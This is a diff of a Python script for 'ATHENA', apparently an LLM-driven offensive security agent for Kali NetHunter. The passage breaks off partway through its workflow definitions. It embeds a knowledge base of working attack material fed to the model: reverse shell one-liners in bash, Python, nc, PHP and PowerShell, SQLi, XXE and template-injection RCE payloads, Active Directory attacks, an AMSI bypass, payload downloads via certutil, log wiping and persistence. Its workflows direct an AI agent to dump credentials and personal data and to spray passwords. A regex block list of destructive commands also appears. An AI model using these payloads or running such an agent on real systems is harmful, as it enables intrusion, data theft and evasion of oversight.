@@ -1,11 +1,19 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════════════╗
-║           ATHENA — AI Offensive Security Agent v5.0              ║
+║           ATHENA — AI Offensive Security Agent v6.1              ║
 ║   Bare-metal Kali NetHunter | sdm845 | Phosh UI                  ║
 ║   Commander: The Priest                                           ║
-║   Full expert knowledge base | Elite tradecraft | 23 workflows    ║
+║   Auto-exploit | Persistent findings | Stuck recovery             ║
 ╚══════════════════════════════════════════════════════════════════╝
+
+v6.1 IMPROVEMENTS:
+- Auto-exploit engine: CVE → searchsploit → suggest execution
+- Persistent findings: saved to ~/.athena/findings.json
+- Stuck recovery: actually works now (triggers at 3 failures)
+- Rate limit resilience: retries request on new provider
+- Smart credential attacks: uses wordlist files
+- Wildcard detection: adapts gobuster when server returns 200 for all
 """
 
 import os
@@ -13,6 +21,7 @@ import sys
 import subprocess
 import re
 import datetime
+import json
 
 try:
     from groq import Groq
@@ -21,30 +30,37 @@ except ImportError:
     sys.exit(1)
 
 try:
+    from cerebras.cloud.sdk import Cerebras
+except ImportError:
+    Cerebras = None
+
+try:
     import readline
 except ImportError:
     pass
+
 
 # ─────────────────────────────────────────────────────────────
 # CONSTANTS
 # ─────────────────────────────────────────────────────────────
 
-VERSION = "5.0"
+VERSION = "6.1"
 
-BANNER = """\033[35m
- █████╗ ████████╗██╗  ██╗███████╗███╗   ██╗ █████╗
-██╔══██╗╚══██╔══╝██║  ██║██╔════╝████╗  ██║██╔══██╗
-███████║   ██║   ███████║█████╗  ██╔██╗ ██║███████║
-██╔══██║   ██║   ██╔══██║██╔══╝  ██║╚██╗██║██╔══██║
-██║  ██║   ██║   ██║  ██║███████╗██║ ╚████║██║  ██║
-╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝
-\033[0m\033[90m        AI Offensive Security Agent v5.0
-           Commander: The Priest | Kali NetHunter
-   Elite Knowledge | Full Tradecraft | 23 Workflows\033[0m
-"""
+PROVIDER_CHAIN = [
+    ("groq", "llama-3.3-70b-versatile",                       "LLaMA 3.3 70B"),
+    ("groq", "openai/gpt-oss-120b",                            "GPT-OSS 120B"),
+    ("groq", "meta-llama/llama-4-scout-17b-16e-instruct",      "LLaMA 4 Scout 17B"),
+    ("groq", "qwen/qwen3-32b",                                  "Qwen3 32B"),
+    ("groq", "groq/compound",                                   "Groq Compound"),
+    ("groq", "openai/gpt-oss-20b",                              "GPT-OSS 20B"),
+    ("groq", "groq/compound-mini",                              "Compound Mini"),
+    ("groq", "allam-2-7b",                                      "Allam 2 7B"),
+    ("groq", "llama-3.1-8b-instant",                            "LLaMA 3.1 8B"),
+]
 
 INSTALL_DIR = os.path.expanduser("~/.athena")
 LOG_DIR     = os.path.join(INSTALL_DIR, "logs")
+FINDINGS_FILE = os.path.join(INSTALL_DIR, "findings.json")
 BOOT_LOCK   = "/tmp/athena_session.lock"
 
 BANNED_COMMANDS = [
@@ -53,26 +69,310 @@ BANNED_COMMANDS = [
 ]
 BANNED_UPGRADE_PACKAGES = ["phosh", "lightdm", "xfce", "x11", "gnome-shell"]
 
-MAX_HISTORY_MESSAGES = 14
+DESTRUCTIVE_COMMANDS = [
+    r'\brm\s+-rf\s+/',
+    r'\brm\s+-rf\s+\*',
+    r'\brm\s+-rf\s+~',
+    r'\bdd\s+if=',
+    r'\bmkfs\b',
+    r'>\s*/dev/sd[a-z]',
+    r':\(\)\{.*\|.*&.*\};:',
+    r'\bchmod\s+-R\s+777\s+/',
+    r'\bchown\s+-R.*\s+/',
+    r'\bshutdown\b',
+    r'\bhalt\b',
+    r'\binit\s+0',
+    r'\binit\s+6',
+    r'\bpoweroff\b',
+    r'>\s*/dev/null\s+2>&1\s*&\s*$',
+]
+
+DOUBLE_CONFIRM = [
+    r'systemctl\s+(stop|disable|mask)',
+    r'service\s+\S+\s+stop',
+    r'iptables\s+-F',
+    r'ufw\s+disable',
+    r'>\s*/etc/',
+    r'sed\s+-i.*\s+/etc/',
+    r'echo.*>>\s*/etc/',
+    r'echo.*>\s*/etc/',
+    r'chmod\s+\+s\s+',
+    r'useradd\s+',
+    r'userdel\s+',
+    r'passwd\s+',
+    r'\bkillall\b',
+]
+
+INTERACTIVE_BLOCKED = {
+    "msfconsole":   "Use: msfconsole -q -r /tmp/script.rc (script must end with 'exit')",
+    "mysql -u":     "Use: mysql -u USER -pPASS -e 'QUERY;' for non-interactive query",
+    "psql":         "Use: psql -c 'QUERY;' for non-interactive query",
+    "telnet":       "Use: nc -nv [IP] [PORT] for one-shot banner grab",
+    "nc -l":        "Listener blocked — would hang Athena. Run in separate terminal.",
+    "ncat -l":      "Listener blocked — would hang Athena. Run in separate terminal.",
+    "vim ":         "Use: cat or sed for non-interactive file ops",
+    "vi ":          "Use: cat or sed for non-interactive file ops",
+    "nano ":        "Use: cat or sed for non-interactive file ops",
+    "less ":        "Use: cat or head/tail for non-interactive viewing",
+    "more ":        "Use: cat or head/tail for non-interactive viewing",
+    "top":          "Use: ps aux for non-interactive process list",
+    "htop":         "Use: ps aux for non-interactive process list",
+    "ssh ":         "SSH interactive — use sshpass -p PASS ssh user@host 'COMMAND' instead",
+    "ftp ":         "FTP interactive — use curl ftp://user:pass@host/file instead",
+    "gdb ":         "GDB interactive — use gdb -batch -ex 'cmd' instead",
+}
+
+MAX_HISTORY_MESSAGES = 10
 MAX_OUTPUT_CHARS     = 4000
 WORKFLOW_DONE        = "WORKFLOW_COMPLETE"
 
 FINDING_PATTERNS = {
-    "ip_address":   r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b',
-    "open_port":    r'(\d+)/tcp\s+open\s+(\S+)',
-    "username":     r'(?:user(?:name)?|login|account)[:\s]+([a-zA-Z0-9_\.\-]{3,})',
-    "email":        r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)',
-    "hash_ntlm":    r'\b([a-fA-F0-9]{32}:[a-fA-F0-9]{32})\b',
-    "hash_generic": r'\b([a-fA-F0-9]{40,64})\b',
-    "url":          r'(https?://[^\s\'"<>]{8,})',
-    "cve":          r'(CVE-\d{4}-\d+)',
-    "credential":   r'(?:password|passwd|pass|pwd)[:\s=]+([^\s\n\r]{4,32})',
-    "service_ver":  r'\d+/tcp\s+open\s+\S+\s+(.+?)(?:\n|$)',
-    "domain":       r'\b([a-zA-Z0-9\-]+\.[a-zA-Z]{2,})\b',
+    "ip":         r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b',
+    "port":       r'(\d+)/tcp\s+open\s+(\S+)',
+    "user":       r'(?:user(?:name)?|login)[:\s]+([a-zA-Z0-9_\.\-]{3,32})',
+    "hash_ntlm":  r'\b([a-fA-F0-9]{32}:[a-fA-F0-9]{32})\b',
+    "hash":       r'\b([a-fA-F0-9]{40,64})\b',
+    "cred":       r'(?:password|passwd|pass)[:\s=]+([^\s\n\r]{4,32})',
+    "cve":        r'(CVE-\d{4}-\d+)',
+    "svc":        r'\d+/tcp\s+open\s+\S+\s+(.+?)(?:\n|$)',
+    "domain":     r'\b([a-zA-Z0-9\-]+\.[a-zA-Z]{2,6})\b',
 }
 
+IP_NOISE = {'0.0.0.0','127.0.0.1','255.255.255.255','8.8.8.8','8.8.4.4'}
+
+# Credential wordlists (fallback to hardcoded if files missing)
+CRED_WORDLISTS = [
+    "/usr/share/wordlists/metasploit/common_passwords.txt",
+    "/usr/share/wordlists/fasttrack.txt",
+    "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt",
+]
+
+FALLBACK_PASSWORDS = [
+    "admin", "password", "123456", "root", "toor", "kali",
+    "admin123", "password123", "letmein", "welcome", "default"
+]
+
+
 # ─────────────────────────────────────────────────────────────
-# ALL 23 WORKFLOWS
+# KNOWLEDGE BASE (same as v6.0)
+# ─────────────────────────────────────────────────────────────
+
+KB = {}
+
+KB[1] = r"""
+S1 MINDSET: Pick minimum-path action toward goal. Map trust boundaries (web→DB→AD). 
+Note noise: nmap -p- LOUD, gobuster MED, curl QUIET. Three approaches per goal — fall back fast.
+Skip phases when findings already cover them. APT mindset: every cmd deliberate."""
+
+KB[2] = r"""
+SECTION 2 — NETWORK RECON:
+Host discovery: arp-scan -l | fping -ag 192.168.1.0/24 | for i in {1..254}; do ping -c1 -W1 192.168.1.$i &>/dev/null && echo up; done
+Fast scan: nmap -sS -T4 --min-rate 5000 | masscan -p1-65535 --rate=1000
+Banner grab: nc -nv [IP] [PORT] | telnet [IP] [PORT]
+Key script categories: --script vuln | --script smb-* | --script http-* | --script ssl-*
+Firewall detection: nmap -sA (ACK scan) | nmap --reason | nmap -f (fragment)
+OS detection: nmap -O | nmap -A"""
+
+KB[3] = r"""
+SECTION 3 — WEB EXPLOITATION:
+Always manually browse first — automated tools miss business logic, race conditions, multi-step vulns.
+SQL injection: ' OR '1'='1'-- | ' OR SLEEP(5)-- | ' UNION SELECT NULL,NULL-- (add NULLs until no error)
+File read MySQL: ' UNION SELECT load_file('/etc/passwd'),NULL--
+XSS bypass: <img src=x onerror=alert(1)> | <svg onload=alert(1)> | "><script>alert(1)</script>
+SSRF targets: http://169.254.169.254/latest/meta-data/ (AWS) | http://metadata.google.internal/computeMetadata/v1/ (GCP) | internal services http://localhost:PORT
+LFI to RCE: read /etc/passwd -> read logs -> inject PHP in User-Agent -> include log file
+XXE: <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+Template injection test: {{7*7}} ${7*7} <%= 7*7 %> -- if 49 in response = confirmed
+Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+JWT attacks: decode with base64 -d | try alg:none | brute secret with hashcat -m 16500
+File upload bypass: change Content-Type to image/jpeg | double ext shell.php.jpg | null byte shell.php%00.jpg"""
+
+KB[4] = r"""
+SECTION 4 — ACTIVE DIRECTORY:
+Kill chain: unauthenticated enum -> usernames -> AS-REP roast -> crack -> authenticated enum -> ACL abuse -> DCSync
+AS-REP roast (no creds): impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip [DC]
+  Crack: hashcat -m 18200 hash.txt rockyou.txt
+Kerberoast (needs account): impacket-GetUserSPNs domain/user:pass -dc-ip [DC] -request
+  Crack: hashcat -m 13100 hash.txt rockyou.txt
+Pass-the-hash: impacket-psexec domain/user@[IP] -hashes :[NTLM] | crackmapexec smb [IP] -u user -H [HASH]
+DCSync (DA rights): impacket-secretsdump domain/admin:pass@[DC] -- dumps ALL hashes
+Golden ticket: impacket-ticketer -nthash [KRBTGT_HASH] -domain-sid [SID] -domain [DOMAIN] Administrator
+Zerologon (CVE-2020-1472): nmap --script smb-vuln-zerologon [DC] -- unauthenticated DC compromise
+ADCS ESC1: certipy find -u user@domain -p pass -dc-ip [DC] | certipy req -upn administrator@domain
+ACL abuse: GenericAll=reset password | WriteDACL=grant yourself rights | GenericWrite=set SPN then Kerberoast"""
+
+KB[5] = r"""
+SECTION 5 — LINUX PRIVESC:
+Sudo GTFOBins: vim -> :!bash | find -> sudo find . -exec /bin/bash \; | python -> import os;os.system("/bin/bash") | awk -> awk 'BEGIN{system("/bin/bash")}' | less -> !/bin/bash
+SUID: /usr/bin/find -exec /bin/bash -p \; | /usr/bin/python -c 'import os;os.execl("/bin/sh","sh","-p")'
+Cron abuse: if script writable -> echo 'chmod +s /bin/bash' >> script.sh | wildcard injection with tar *
+Capabilities: getcap -r / 2>/dev/null | python3 cap_setuid -> os.setuid(0);os.system("/bin/bash")
+Docker group: docker run -v /:/mnt -it alpine chroot /mnt /bin/bash -- instant root
+Writable /etc/passwd: openssl passwd -1 newpass -> append newroot:hash:0:0:root:/root:/bin/bash
+Kernel exploits: check uname -r against linux-exploit-suggester | Dirty COW < 4.8.3
+NFS no_root_squash: cat /etc/exports -> mount share -> cp bash -> chmod +s -> execute -p"""
+
+KB[6] = r"""
+SECTION 6 — WINDOWS PRIVESC:
+SeImpersonatePrivilege: whoami /priv -> PrintSpoofer (Win10/2019) | GodPotato (2012-2022) | JuicyPotato (2016 and below)
+Unquoted paths: wmic service get name,pathname | findstr /i /v "C:\\Windows" | findstr /i /v quoted
+  Place binary earlier in path -> restarts as SYSTEM
+AlwaysInstallElevated: reg query HKCU/HKLM ...\\Installer /v AlwaysInstallElevated -- both must be 1
+  msfvenom -p windows/exec CMD='net user...' -f msi | msiexec /quiet /i evil.msi
+Stored creds: cmdkey /list | reg query HKLM /f password /t REG_SZ /s | dir /s *pass* *cred*
+Weak service perms: accesschk -uwcqv "Authenticated Users" * | sc config [svc] binPath= "cmd /c [payload]" """
+
+KB[7] = r"""
+SECTION 7 — POST-EXPLOITATION:
+LOTL Linux: bash python3 perl ruby php nc socat curl wget find cat awk base64 openssl
+LOTL Windows: cmd powershell certutil bitsadmin msiexec regsvr32 rundll32 wmic mshta
+Persistence Linux: ~/.bashrc | crontab -e | ~/.ssh/authorized_keys | /etc/rc.local
+Persistence Windows: reg HKCU\\...\\Run | schtasks /create | sc create
+Log cleaning: history -c && history -w | echo "" > /var/log/auth.log | unset HISTFILE
+Pivoting: ssh -L 8080:internal:80 | ssh -D 1080 (SOCKS) | socat TCP-LISTEN:8080,fork TCP:target:80
+Chisel: server -> chisel server -p 9000 --reverse | client -> chisel client [SVR]:9000 R:8080:internal:80
+Cred hunting Linux: find / -name id_rsa | find / -name .env | find / -name wp-config.php | grep -r password /etc/
+Cred hunting Windows: reg query "...\\Winlogon" | netsh wlan show profile [SSID] key=clear"""
+
+KB[8] = r"""
+SECTION 8 — HIGH VALUE CVEs:
+Apache 2.4.49 CVE-2021-41773: curl --path-as-is 'http://[IP]/cgi-bin/.%2F.%2F.%2Fetc/passwd'
+EternalBlue MS17-010: nmap --script smb-vuln-ms17-010 | use exploit/windows/smb/ms17_010_eternalblue
+Zerologon CVE-2020-1472: impacket-zerologon [DC_HOST] [DC_IP] -- reset DC password -> DCSync
+PrintNightmare CVE-2021-34527: use exploit/windows/local/cve_2021_34527_printnightmare
+Shellshock CVE-2014-6271: curl -H 'User-Agent: () { :; }; /bin/cat /etc/passwd' http://[IP]/cgi-bin/test.cgi
+Log4Shell CVE-2021-44228: ${jndi:ldap://[attacker]/a} in any logged field (User-Agent username search)
+Heartbleed CVE-2014-0160: nmap --script ssl-heartbleed | leaks 64KB server memory per request
+Dirty COW CVE-2016-5195: Linux kernel < 4.8.3 -- race condition write to read-only memory
+Sudo Baron Samedit CVE-2021-3156: sudo < 1.9.5p2 -- heap overflow -> root without password"""
+
+KB[9] = r"""
+SECTION 9 — EVASION:
+AMSI bypass PowerShell: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+Payload encoding: msfvenom -e x64/xor_dynamic -i 10 -- reduces signature detection not behaviour
+LOTL delivery: certutil -urlcache -split -f http://[IP]/shell.exe | bitsadmin /transfer job http://[IP]/shell.exe
+Network evasion: use HTTPS C2 on port 443 | randomise User-Agent | slow and low timing
+File upload bypass: Content-Type: image/jpeg with PHP content | shell.php.jpg | shell.PhP | shell.phtml
+Fragmentation: nmap -f --mtu 8 | decoys: nmap -D RND:10 | timing: nmap -T1 --scan-delay 10s"""
+
+KB[10] = r"""
+SECTION 10 — CREDENTIAL ATTACKS:
+Password reuse: if admin:admin found on one device try all similar devices immediately
+Default creds: routers admin/admin | Tomcat tomcat/tomcat | Jenkins admin/admin | MySQL root/[blank] | Redis no auth | Postgres postgres/postgres | Elasticsearch no auth old versions
+Hash modes: MD5=-m 0 | SHA1=-m 100 | NTLM=-m 1000 | NTLMv2=-m 5600 | WPA2=-m 22000 | bcrypt=-m 3200 | Kerberoast=-m 13100 | AS-REP=-m 18200
+Spray timing: default AD lockout 5 attempts/30min = 1 password per 30min across all users
+crackmapexec spray: cme smb [IP] -u users.txt -p 'Password1' --continue-on-success"""
+
+KB[11] = r"""
+SECTION 11 — VERIFIED MSF MODULES:
+exploit/windows/smb/ms17_010_eternalblue | exploit/multi/handler | exploit/unix/ftp/vsftpd_234_backdoor
+exploit/unix/irc/unreal_ircd_3281_backdoor | exploit/windows/http/rejetto_hfs_exec
+auxiliary/scanner/smb/smb_ms17_010 | auxiliary/scanner/portscan/tcp | auxiliary/scanner/smb/smb_login
+auxiliary/scanner/ftp/ftp_login | auxiliary/scanner/ssh/ssh_login
+post/multi/recon/local_exploit_suggester | post/linux/gather/hashdump | post/windows/gather/hashdump
+Resource script template (LAST LINE MUST BE exit):
+  use [verified_module]
+  set RHOSTS [target]
+  set LHOST [lhost]
+  set LPORT [port]
+  run
+  exit"""
+
+KB[12] = r"""
+SECTION 12 — REVERSE SHELLS:
+bash: bash -i >& /dev/tcp/[IP]/4444 0>&1
+python3: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("[IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+nc: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [IP] 4444 >/tmp/f
+php: php -r '$sock=fsockopen("[IP]",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+powershell: powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('[IP]',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$send=(iex $data 2>&1|Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($send+'PS '+(pwd).Path+'> ');$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+Listener: rlwrap nc -lvnp 4444
+TTY upgrade: python3 -c 'import pty;pty.spawn("/bin/bash")' then Ctrl+Z then stty raw -echo;fg then export TERM=xterm"""
+
+KB[13] = r"""
+SECTION 13 — NETWORK SERVICES:
+FTP 21: ftp [IP] anonymous:anonymous | vsftpd 2.3.4 backdoor :) triggers port 6200
+SSH 22: ssh-audit for weak algos | CVE-2018-15473 user enum | ssh -i id_rsa if key found
+SMTP 25: nc [IP] 25 then VRFY/EXPN for user enum | open relay test MAIL FROM RCPT TO external
+SMB 445: EternalBlue check | anonymous share list smbclient -L -N | signing check with cme
+RDP 3389: xfreerdp /u:user /p:pass /v:[IP]
+MySQL 3306: mysql -h [IP] -u root --password= | SELECT user,password FROM mysql.user
+Redis 6379: redis-cli -h [IP] then KEYS * | write SSH key via CONFIG SET
+MongoDB 27017: mongo [IP]:27017 no auth old versions | show dbs
+Elasticsearch 9200: curl http://[IP]:9200/_cat/indices then dump"""
+
+KB[14] = r"""
+S14 DECISION TREES:
+Web→tech ID→CVE→inputs(SQLi/XSS/LFI)→robots.txt→default creds→upload.
+Shell→pty stabilise→id/uname/sudo -l→SUID/cron/GTFOBins→linpeas→creds.
+Unknown port→nc banner→nmap -sV→curl→searchsploit.
+Stuck→re-enum→UDP→vhosts→authenticated recon→second-order."""
+
+
+# ─────────────────────────────────────────────────────────────
+# WORKFLOW KB MAPPING (same as v6.0)
+# ─────────────────────────────────────────────────────────────
+
+WORKFLOW_KB_MAP = {
+    "1":  [2, 8, 14],
+    "2":  [3, 8, 14],
+    "3":  [5, 7, 10, 14],
+    "4":  [11, 12],
+    "5":  [3, 10, 14],
+    "6":  [10],
+    "7":  [10, 13],
+    "8":  [4, 10, 9],
+    "9":  [11, 12, 9],
+    "10": [2],
+    "11": [2, 3, 14],
+    "12": [2, 8],
+    "13": [2, 13],
+    "14": [4, 10, 13],
+    "15": [3, 14],
+    "16": [5, 7, 14],
+    "17": [6, 7, 10],
+    "18": [4, 7, 9],
+    "19": [7, 9],
+    "20": [9, 2],
+    "21": [7, 9],
+    "22": [14],
+    "23": [14],
+}
+
+KEYWORD_KB_MAP = {
+    "web|http|https|sql|xss|lfi|rfi|ssrf|api|jwt|oauth|cookie|upload": [3, 14],
+    "smb|windows|active directory|domain|kerberos|ntlm|ldap|dc|ad": [4, 10],
+    "linux|sudo|suid|cron|privilege|root|privesc|escalat": [5, 7, 14],
+    "windows|system|service|token|potato|uac|dll": [6, 7, 10],
+    "hash|crack|hashcat|password|spray|brute|credential": [10, 12],
+    "metasploit|msf|msfvenom|payload|shell|reverse": [11, 12],
+    "evasion|bypass|amsi|antivirus|av|ids|ips|stealth": [9],
+    "lateral|pivot|pass.the|pth|dcsync|secretsdump": [4, 7, 9],
+    "nmap|scan|recon|network|port|service": [2, 8, 14],
+    "cloud|docker|container|aws|gcp|azure|kubernetes|k8s": [7, 9],
+}
+
+
+def get_kb_sections(workflow_key: str = None, prompt_text: str = "") -> str:
+    """Return only the KB sections relevant to this workflow or prompt."""
+    section_nums = {1}
+    if workflow_key and workflow_key in WORKFLOW_KB_MAP:
+        section_nums.update(WORKFLOW_KB_MAP[workflow_key])
+    elif prompt_text:
+        lower = prompt_text.lower()
+        for pattern, nums in KEYWORD_KB_MAP.items():
+            if re.search(pattern, lower):
+                section_nums.update(nums)
+        if len(section_nums) == 1:
+            section_nums.update([2, 14])
+    parts = []
+    for num in sorted(section_nums):
+        if num in KB:
+            parts.append(KB[num])
+    return "\n\n".join(parts)
+
+
+# ─────────────────────────────────────────────────────────────
+# WORKFLOWS (same as v6.0 — keeping all 23)
 # ─────────────────────────────────────────────────────────────
 
 WORKFLOWS = {
@@ -80,1095 +380,393 @@ WORKFLOWS = {
         "name": "Network Recon",
         "description": "ARP sweep -> port scan -> service detection -> CVE correlation",
         "prompt": (
-            "Begin elite network recon against target: {target}.\n"
-            "Phase 1: arp-scan -l to discover live hosts.\n"
-            "Phase 2: nmap -sn to ping sweep and confirm live hosts.\n"
-            "Phase 3: nmap -sV -sC -p- --min-rate 1000 for full port scan with version detection.\n"
-            "Phase 4: nmap -O for OS fingerprinting.\n"
+            "Elite network recon against: {target}.\n"
+            "Phase 1: arp-scan -l for live hosts.\n"
+            "Phase 2: nmap -sn ping sweep.\n"
+            "Phase 3: nmap -sV -sC -p- --min-rate 1000 full scan.\n"
+            "Phase 4: nmap -O OS fingerprint.\n"
             "Phase 5: searchsploit every service version found.\n"
-            "Phase 6: For every open port cross-reference with known high-value attack vectors in your knowledge.\n"
-            "After each output analyze in [THOUGHT] using elite pentester reasoning. "
-            "Issue one [CMD] at a time. When complete put WORKFLOW_COMPLETE in [CMD]."
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "2": {
         "name": "Web Enumeration",
-        "description": "Full web attack surface mapping with elite tradecraft",
+        "description": "Tech fingerprint -> vuln scan -> dir brute -> vhost",
         "prompt": (
-            "Begin elite web enumeration against: {target}.\n"
-            "Phase 1: whatweb -a 3 for aggressive tech fingerprinting.\n"
-            "Phase 2: nikto -h {target} for misconfigurations and known vulns.\n"
-            "Phase 3: gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old,zip.\n"
-            "Phase 4: Check robots.txt sitemap.xml .env .git/HEAD /.svn backup files.\n"
-            "Phase 5: gobuster vhost -u {target} -w /usr/share/wordlists/dirb/common.txt if domain found.\n"
-            "Phase 6: searchsploit every identified technology version.\n"
-            "Phase 7: Test for SSRF by injecting internal URLs into any parameter that fetches a URL.\n"
-            "Phase 8: Check response headers for security misconfigurations.\n"
-            "Issue one [CMD] at a time. When complete put WORKFLOW_COMPLETE in [CMD]."
+            "Elite web enumeration against: {target}.\n"
+            "Phase 1: whatweb -a 3 aggressive fingerprint.\n"
+            "Phase 2: nikto -h {target}.\n"
+            "Phase 3: gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,zip.\n"
+            "Phase 4: Check robots.txt .env .git/HEAD backup files.\n"
+            "Phase 5: gobuster vhost if domain found.\n"
+            "Phase 6: searchsploit every technology version.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "3": {
         "name": "Post-Exploitation",
-        "description": "Full post-exploitation with elite LOTL tradecraft",
+        "description": "Identity -> sudo -> SUID -> cron -> network -> creds",
         "prompt": (
-            "Begin elite post-exploitation on current host.\n"
-            "Phase 1: id whoami hostname uname -a cat /etc/os-release ip a.\n"
-            "Phase 2: sudo -l -- analyze output for GTFOBins exploitation paths.\n"
-            "Phase 3: find / -perm -4000 -type f 2>/dev/null -- cross-reference every SUID with GTFOBins.\n"
-            "Phase 4: crontab -l and cat /etc/crontab -- look for writable scripts in cron paths.\n"
-            "Phase 5: ss -tulnp -- identify internal services not exposed externally.\n"
-            "Phase 6: find / -name '*.conf' -o -name '*.ini' -o -name '*.cfg' 2>/dev/null | xargs grep -l 'pass' 2>/dev/null.\n"
-            "Phase 7: cat ~/.bash_history -- extract commands that reveal credentials or internal infrastructure.\n"
-            "Phase 8: cat /etc/passwd | grep -v nologin -- identify real user accounts.\n"
-            "Phase 9: Check for writable paths in /etc/crontab scripts and replace with reverse shell.\n"
-            "Issue one [CMD] at a time. Use elite [THOUGHT] reasoning. When complete put WORKFLOW_COMPLETE in [CMD]."
+            "Elite post-exploitation on current host.\n"
+            "Phase 1: id whoami hostname uname -a ip a.\n"
+            "Phase 2: sudo -l -- check GTFOBins for every entry.\n"
+            "Phase 3: find / -perm -4000 -type f 2>/dev/null -- GTFOBins every result.\n"
+            "Phase 4: crontab -l && cat /etc/crontab -- look for writable scripts.\n"
+            "Phase 5: ss -tulnp for internal services.\n"
+            "Phase 6: Hunt creds in bash_history conf files SSH keys env vars.\n"
+            "Phase 7: cat /etc/passwd for real user accounts.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "4": {
         "name": "Metasploit Exploit",
-        "description": "Validated MSF resource script -> non-interactive execution",
+        "description": "Verify module -> resource script -> non-interactive run",
         "prompt": (
-            "Run a Metasploit exploit against: {target}.\n"
-            "Phase 1: Verify module exists: msfconsole -q -x 'search [keyword]; exit' BEFORE writing script.\n"
-            "Phase 2: Write complete resource script to /tmp/athena_msf.rc using tee.\n"
-            "Script must have: use [verified_module] set RHOSTS set LHOST set LPORT run exit.\n"
-            "LAST LINE MUST BE 'exit'. NEVER use unverified modules.\n"
+            "Run Metasploit against: {target}.\n"
+            "Phase 1: Verify module exists: msfconsole -q -x 'search [keyword]; exit'\n"
+            "Phase 2: Write /tmp/athena_msf.rc with tee. Include: use set RHOSTS set LHOST set LPORT run exit. LAST LINE MUST BE exit.\n"
             "Phase 3: msfconsole -q -r /tmp/athena_msf.rc\n"
-            "Phase 4: If session opened immediately run post/multi/recon/local_exploit_suggester.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to explain module selection reasoning."
+            "NEVER use unverified modules. One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "5": {
         "name": "SQL Injection",
-        "description": "sqlmap full auto with elite manual verification",
+        "description": "sqlmap full auto with manual verification",
         "prompt": (
-            "Run elite SQL injection assessment against: {target}.\n"
-            "Phase 1: Manual test first -- append ' OR '1'='1 to parameters and observe response differences.\n"
+            "SQL injection assessment against: {target}.\n"
+            "Phase 1: Manual test -- append ' to parameters observe errors.\n"
             "Phase 2: sqlmap -u {target} --dbs --batch --random-agent --level=3 --risk=2.\n"
-            "Phase 3: Dump tables from interesting databases excluding information_schema and mysql.\n"
-            "Phase 4: Extract credentials hashes and sensitive PII.\n"
-            "Phase 5: Test for --os-shell if MySQL with FILE privilege or MSSQL with xp_cmdshell.\n"
-            "Phase 6: Test for --file-read to read server files like /etc/passwd.\n"
-            "Phase 7: If credentials found immediately test across all other services in findings.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to explain injection type and pivot logic."
+            "Phase 3: Dump tables from interesting databases.\n"
+            "Phase 4: Extract credentials and sensitive data.\n"
+            "Phase 5: Test --os-shell if MySQL with FILE privilege.\n"
+            "Phase 6: If creds found test across all session services immediately.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "6": {
         "name": "Hash Cracking",
-        "description": "hashcat elite -- identify mode crack with multiple attack vectors",
+        "description": "hashcat auto -- identify mode crack escalate",
         "prompt": (
-            "Crack the hash or capture at: {target}.\n"
-            "Phase 1: hashid {target} or hashid [hash] to identify type precisely.\n"
-            "Phase 2: Check rockyou.txt exists -- if only .gz gunzip /usr/share/wordlists/rockyou.txt.gz first.\n"
-            "Phase 3: hashcat -m [correct_mode] {target} /usr/share/wordlists/rockyou.txt --show first to check cache.\n"
-            "Phase 4: If not cached run hashcat -m [mode] {target} /usr/share/wordlists/rockyou.txt.\n"
-            "Phase 5: If rockyou fails: hashcat -m [mode] {target} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule.\n"
-            "Phase 6: If rules fail: hashcat -m [mode] {target} -a 3 ?u?l?l?l?l?d?d?d for mask attack.\n"
-            "Phase 7: If WPA hash try: hashcat -m 22000 {target} /usr/share/wordlists/rockyou.txt.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to explain mode selection."
+            "Crack hash or capture at: {target}.\n"
+            "Phase 1: hashid to identify type.\n"
+            "Phase 2: Check rockyou exists -- if only .gz: gunzip /usr/share/wordlists/rockyou.txt.gz\n"
+            "Phase 3: hashcat -m [mode] {target} /usr/share/wordlists/rockyou.txt --show first.\n"
+            "Phase 4: If not cached run full hashcat attack.\n"
+            "Phase 5: If fails: add -r /usr/share/hashcat/rules/best64.rule\n"
+            "Phase 6: If still fails: mask attack -a 3 ?u?l?l?l?l?d?d?d\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "7": {
         "name": "Password Spraying",
-        "description": "Hydra elite credential attacks with lockout awareness",
